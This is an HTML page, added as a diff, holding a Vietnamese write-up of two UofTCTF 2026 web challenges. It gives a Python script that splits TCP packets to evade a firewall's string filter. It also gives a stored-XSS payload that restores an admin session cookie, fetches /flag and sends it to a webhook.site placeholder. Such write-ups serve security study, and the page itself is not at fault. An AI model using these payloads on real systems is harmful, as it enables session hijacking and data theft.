@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="FirewallBài này có firewall quét toàn bộ phần payload của gói tin TCP để tìm chuỗi flag, ký tự bị cấm % –&gt; Tách chuỗi flag này ra là bypass được. Khi này cần chia nhỏ mỗi gói tin chứa 3 bytes. 1234">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Write up UoftCTF 2026 [WEB]">
+<meta property="og:url" content="https://duonghaonika.github.io/2026/01/11/uoftctf-2026/index.html">
+<meta property="og:site_name" content="haonika&#39;s blog">
+<meta property="og:description" content="FirewallBài này có firewall quét toàn bộ phần payload của gói tin TCP để tìm chuỗi flag, ký tự bị cấm % –&gt; Tách chuỗi flag này ra là bypass được. Khi này cần chia nhỏ mỗi gói tin chứa 3 bytes. 1234">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-01-10T17:00:00.000Z">
+<meta property="article:modified_time" content="2026-01-11T15:14:48.813Z">
+<meta property="article:author" content="Duong Quang Hao">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Write up UoftCTF 2026 [WEB]</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Blogs</a></li><!--
+     --><!--
+       --><li><a href="/story/">Story</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/12/11/android-pentest-p2/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://duonghaonika.github.io/2026/01/11/uoftctf-2026/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://duonghaonika.github.io/2026/01/11/uoftctf-2026/&text=Write up UoftCTF 2026 [WEB]"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://duonghaonika.github.io/2026/01/11/uoftctf-2026/&title=Write up UoftCTF 2026 [WEB]"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://duonghaonika.github.io/2026/01/11/uoftctf-2026/&is_video=false&description=Write up UoftCTF 2026 [WEB]"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Write up UoftCTF 2026 [WEB]&body=Check out this article: https://duonghaonika.github.io/2026/01/11/uoftctf-2026/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://duonghaonika.github.io/2026/01/11/uoftctf-2026/&title=Write up UoftCTF 2026 [WEB]"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://duonghaonika.github.io/2026/01/11/uoftctf-2026/&title=Write up UoftCTF 2026 [WEB]"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://duonghaonika.github.io/2026/01/11/uoftctf-2026/&title=Write up UoftCTF 2026 [WEB]"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://duonghaonika.github.io/2026/01/11/uoftctf-2026/&title=Write up UoftCTF 2026 [WEB]"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://duonghaonika.github.io/2026/01/11/uoftctf-2026/&name=Write up UoftCTF 2026 [WEB]&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://duonghaonika.github.io/2026/01/11/uoftctf-2026/&t=Write up UoftCTF 2026 [WEB]"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Firewall"><span class="toc-number">1.</span> <span class="toc-text">Firewall</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Personal-Blog"><span class="toc-number">2.</span> <span class="toc-text">Personal Blog</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lay-flag"><span class="toc-number">2.1.</span> <span class="toc-text">Lấy flag</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Write up UoftCTF 2026 [WEB]
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Duong Quang Hao</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-01-10T17:00:00.000Z" class="dt-published" itemprop="datePublished">2026-01-11</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/ctf/" rel="tag">ctf</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Firewall"><a href="#Firewall" class="headerlink" title="Firewall"></a>Firewall</h2><p>Bài này có firewall quét toàn bộ phần payload của gói tin TCP để tìm chuỗi <code>flag</code>, ký tự bị cấm <code>%</code> –&gt; Tách chuỗi flag này ra là bypass được. Khi này cần chia nhỏ mỗi gói tin chứa 3 bytes.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Cấu hình mục tiêu (IP từ log của bạn)</span></span><br><span class="line">TARGET_IP = <span class="string">&#x27;35.227.38.232&#x27;</span> </span><br><span class="line">TARGET_PORT = <span class="number">5000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_chunk_with_retry</span>(<span class="params">start_byte, end_byte, retries=<span class="number">10</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Gửi request lấy chunk với cơ chế thử lại &#x27;lì lợm&#x27; hơn&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> attempt <span class="keyword">in</span> <span class="built_in">range</span>(retries):</span><br><span class="line">        s = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, <span class="number">1</span>)</span><br><span class="line">            s.settimeout(<span class="number">5</span>) <span class="comment"># Tăng timeout lên 5 giây</span></span><br><span class="line">            s.connect((TARGET_IP, TARGET_PORT))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Payload bypass ingress: &quot;GET /fl&quot; + &quot;ag.html...&quot;</span></span><br><span class="line">            part1 = <span class="string">b&quot;GET /fl&quot;</span></span><br><span class="line">            part2 = <span class="string">b&quot;ag.html HTTP/1.1\r\n&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Header Range bypass egress</span></span><br><span class="line">            headers = <span class="string">f&quot;Host: <span class="subst">&#123;TARGET_IP&#125;</span>\r\nRange: bytes=<span class="subst">&#123;start_byte&#125;</span>-<span class="subst">&#123;end_byte&#125;</span>\r\nConnection: close\r\n\r\n&quot;</span>.encode()</span><br><span class="line"></span><br><span class="line">            s.send(part1)</span><br><span class="line">            time.sleep(<span class="number">0.3</span>) </span><br><span class="line">            s.send(part2 + headers)</span><br><span class="line"></span><br><span class="line">            response = <span class="string">b&quot;&quot;</span></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    data = s.recv(<span class="number">4096</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> data: <span class="keyword">break</span></span><br><span class="line">                    response += data</span><br><span class="line">                <span class="keyword">except</span> socket.timeout:</span><br><span class="line">                    <span class="comment"># Nếu đang đọc dở mà timeout thì break để check dữ liệu</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;HTTP/1.1&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">                <span class="keyword">return</span> response</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  [!] Lần <span class="subst">&#123;attempt+<span class="number">1</span>&#125;</span>: Response rỗng hoặc lỗi. Thử lại...&quot;</span>)</span><br><span class="line">                time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> socket.timeout:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  [!] Lần <span class="subst">&#123;attempt+<span class="number">1</span>&#125;</span>: Timed out! Đang thử lại...&quot;</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> (ConnectionRefusedError, ConnectionResetError, BrokenPipeError) <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  [!] Lần <span class="subst">&#123;attempt+<span class="number">1</span>&#125;</span>: Lỗi kết nối (<span class="subst">&#123;e&#125;</span>). Đợi 2s...&quot;</span>)</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  [Error] Lỗi lạ: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="keyword">if</span> s: s.close()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Đang kết nối tới <span class="subst">&#123;TARGET_IP&#125;</span>:<span class="subst">&#123;TARGET_PORT&#125;</span>...&quot;</span>)</span><br><span class="line">    full_content = <span class="string">b&quot;&quot;</span></span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    chunk_size = <span class="number">3</span> </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Nếu muốn tiếp tục từ đoạn bị lỗi, bạn có thể sửa offset = 99 (nhưng nên chạy lại từ đầu cho chắc)</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = fetch_chunk_with_retry(offset, offset + chunk_size - <span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> resp:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Đã thử nhiều lần nhưng thất bại ở offset này. Dừng lại.&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;\r\n\r\n&quot;</span> <span class="keyword">in</span> resp:</span><br><span class="line">            header, body = resp.split(<span class="string">b&quot;\r\n\r\n&quot;</span>, <span class="number">1</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;416 Range Not Satisfiable&quot;</span> <span class="keyword">in</span> header:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\n[*] Đã đọc hết file.&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Cho phép cả 200 OK và 206 Partial</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;200 OK&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> header <span class="keyword">and</span> <span class="string">b&quot;206 Partial&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> header:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n[!] Server trả về code lạ: <span class="subst">&#123;header.splitlines()[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="comment"># Có thể server chặn, thử sleep dài hơn rồi continue để retry offset này nếu muốn</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">            full_content += body</span><br><span class="line">            safe_body = body.decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\\n&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] Offset <span class="subst">&#123;offset:04d&#125;</span>: <span class="subst">&#123;safe_body&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            offset += chunk_size</span><br><span class="line">            <span class="comment"># Tăng thời gian nghỉ giữa các lần chọc server</span></span><br><span class="line">            time.sleep(<span class="number">0.2</span>) </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Response không đúng định dạng HTTP.&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">40</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] KẾT QUẢ:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(full_content.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">40</span>)</span><br><span class="line">    </span><br><span class="line">    flag_match = re.search(<span class="string">r&#x27;(TEST|CTF|FLAG)\&#123;.*?\&#125;&#x27;</span>, full_content.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> flag_match:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[SUCCESS] FLAG: <span class="subst">&#123;flag_match.group(<span class="number">0</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>Kết quả</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[+] KẾT QUẢ:</span><br><span class="line">&lt;!DOCTYPE html&gt;tml lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">  &lt;title&gt;Flag!&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;h1&gt;Here is your free flag: uoftctf&#123;f1rew4l1_Is_nOT_par7icu11rLy_R0bust_I_bl4m3_3bpf&#125;&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Personal-Blog"><a href="#Personal-Blog" class="headerlink" title="Personal Blog"></a>Personal Blog</h2><p>Bài này có API <code>/api/autosave</code> dùng để save nội dung bài viết mà người dùng đang chỉnh sửa. </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/autosave&#x27;</span>, requireLogin, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> db = req.<span class="property">db</span>;</span><br><span class="line">  <span class="keyword">const</span> postId = <span class="title class_">Number</span>.<span class="built_in">parseInt</span>(req.<span class="property">body</span>.<span class="property">postId</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title class_">Number</span>.<span class="built_in">isFinite</span>(postId)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">ok</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> post = <span class="title function_">getPostById</span>(db, req.<span class="property">user</span>.<span class="property">id</span>, postId);</span><br><span class="line">  <span class="keyword">if</span> (!post) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">json</span>(&#123; <span class="attr">ok</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> rawContent = <span class="title class_">String</span>(req.<span class="property">body</span>.<span class="property">content</span> || <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  post.<span class="property">draftContent</span> = rawContent;</span><br><span class="line">  post.<span class="property">updatedAt</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">  <span class="title function_">saveDb</span>(db);</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">ok</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>Thấy <code>post.draftContent = rawContent;</code> –&gt; rawContent không được <code>sanitizeHtml</code> –&gt; Stored XSS. Tuy nhiên thì XSS chỉ xảy ra khi chính người dùng đó truy cập chức năng chỉnh sửa bài viết của mình.</p>
+<p>Tiếp nữa có API <code>/magic/:token</code>.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/magic/:token&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> db = req.<span class="property">db</span>;</span><br><span class="line">  <span class="keyword">const</span> token = req.<span class="property">params</span>.<span class="property">token</span>;</span><br><span class="line">  <span class="keyword">const</span> record = db.<span class="property">magicLinks</span>[token];</span><br><span class="line">  <span class="keyword">if</span> (!record) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid token.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> existingSid = req.<span class="property">cookies</span>.<span class="property">sid</span>;</span><br><span class="line">  <span class="keyword">if</span> (existingSid) &#123;</span><br><span class="line">    res.<span class="title function_">cookie</span>(<span class="string">&#x27;sid_prev&#x27;</span>, existingSid, <span class="title function_">cookieOptions</span>());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> sid = <span class="title function_">createSession</span>(db, record.<span class="property">userId</span>);</span><br><span class="line">  <span class="title function_">saveDb</span>(db);</span><br><span class="line">  res.<span class="title function_">cookie</span>(<span class="string">&#x27;sid&#x27;</span>, sid, <span class="title function_">cookieOptions</span>());</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> target = <span class="title function_">safeRedirect</span>(req.<span class="property">query</span>.<span class="property">redirect</span>);</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">redirect</span>(target);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>Rõ ràng khi bot truy cập API trên, bot sẽ đăng nhập tài khoản người dùng và tạo ra cookie mới là <code>sid_prev</code> –&gt; đây là cookie admin.</p>
+<p>Truy cập chức năng report và nhập URL vào form, ví dụ:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:3000/magic/a211314f7e272f083cde5c5816e631f5?redirect=/edit/404</span><br></pre></td></tr></table></figure>
+
+<p>Khi này bot sẽ đăng nhập tài khoản người dùng, sau đó redirect về chức năng sửa bài viết 404 –&gt; XSS</p>
+<h3 id="Lay-flag"><a href="#Lay-flag" class="headerlink" title="Lấy flag"></a>Lấy flag</h3><p>Đầu tiên tạo 1 bài viết bất kỳ, sau đó chạy lệnh sau:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">fetch(&#x27;/api/autosave&#x27;, &#123;</span><br><span class="line">  method: &#x27;POST&#x27;,</span><br><span class="line">  headers: &#123; &#x27;Content-Type&#x27;: &#x27;application/json&#x27; &#125;,</span><br><span class="line">  body: JSON.stringify(&#123;</span><br><span class="line">    postId: 2, // ID bài viết của bạn</span><br><span class="line">    content: `&lt;script&gt;</span><br><span class="line">      // 1. Lấy session cũ của Admin từ cookie sid_prev</span><br><span class="line">      const cookies = document.cookie.split(&#x27;; &#x27;);</span><br><span class="line">      let sidPrev = &#x27;&#x27;;</span><br><span class="line">      for (const c of cookies) &#123;</span><br><span class="line">        const [key, val] = c.split(&#x27;=&#x27;);</span><br><span class="line">        if (key === &#x27;sid_prev&#x27;) sidPrev = val;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      // 2. Nếu tìm thấy, khôi phục session Admin và lấy cờ</span><br><span class="line">      if (sidPrev) &#123;</span><br><span class="line">        document.cookie = &quot;sid=&quot; + sidPrev + &quot;; path=/&quot;;</span><br><span class="line">        fetch(&#x27;/flag&#x27;)</span><br><span class="line">          .then(r =&gt; r.text())</span><br><span class="line">          .then(flag =&gt; &#123;</span><br><span class="line">            // Thay URL bên dưới bằng RequestBin/Webhook của bạn</span><br><span class="line">            fetch(&#x27;https://webhook.site/YOUR-UNIQUE-ID?flag=&#x27; + encodeURIComponent(flag));</span><br><span class="line">          &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;/script&gt;`</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>Flag: <code>	uoftctf&#123;533M5_l1k3_17_W4snt_50_p3r50n41...&#125;</code>.</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Blogs</a></li>
+        
+          <li><a href="/story/">Story</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
